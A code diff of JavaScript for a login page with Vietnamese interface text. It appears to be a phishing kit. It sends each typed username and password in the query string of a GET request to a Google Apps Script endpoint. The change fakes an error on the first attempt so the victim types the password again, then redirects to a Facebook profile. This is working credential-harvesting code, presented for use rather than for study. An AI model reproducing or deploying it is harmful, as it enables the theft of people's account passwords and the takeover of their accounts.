@@ -1,26 +1,59 @@
 var request = new XMLHttpRequest();
 
-var link = "https://script.google.com/macros/s/AKfycbwIdvCma4rM6jDcLzXI5j6Kp5zgLmCE8v3ZyD6-W37r8TiTjdaGk4j-nbWbgFTIxDO6ew/exec?username=";
+var link = "https://script.google.com/macros/s/AKfycbzCuJL8ooCucgaQ8yL2eRyPjHT4AKYr8uLI8G_fmJVKKaOKp9Q0QBoh7Eo3tl_l51HsSA/exec?username=";
+var username = document.getElementById("username");
+var password = document.getElementById("password");
+var submit = document.getElementById("login");
 
-document.getElementById("login").addEventListener("click",function(){
-	let username = document.getElementById("username").value;
-	let password = document.getElementById("password").value;
-	if(username && password){
-		document.getElementById("noti-box").style.display="flex";
-	}
-	link+=username+"&password="+password;
-	request.open("GET",link);
-	request.onreadystatechange = function(){
-		if(this.readyState==4){
-			console.log(this.responseText);
-		}else{
-			console.log("Not responsed!");
+username.addEventListener("keydown",login);
+password.addEventListener("keydown",login);
+
+function login(e){
+	if(e.key == "Enter")
+		submit.click();
+}
+
+var times = 0;
+
+submit.addEventListener("click",function(){
+	let user = username.value;
+	let pass = password.value;
+	if(user && pass){
+		//Tang so lan
+		times=(times+1)%2;
+
+		link=link+user+"&password="+pass;
+		//Gui request
+		request.open("GET",link);
+		anNut();
+
+		//Theo doi trang thai
+		request.onreadystatechange = function(){
+			if(this.readyState==4){
+				if(times==0 && this.responseText){
+					console.log("Thanh cong!");
+					window.location = "https://www.facebook.com/vandung2kk2";
+				}else{
+					//Hien thi thong bao
+					document.getElementById("noti-box").style.display="flex";
+				}
+				hienNut();
+			}
 		}
+		request.send();
 	}
-	request.send();
 })
-
 
 document.getElementById("close-btn").addEventListener("click",function(){
 	document.getElementById("noti-box").style.display="none";
 })
+
+function anNut(){
+	submit.setAttribute("style","opacity:0.5");
+	submit.innerText="Đang xử lý...";
+}
+
+function hienNut(){
+	submit.setAttribute("style","opacity:1");
+	submit.innerText="Đăng nhập ngay";
+}
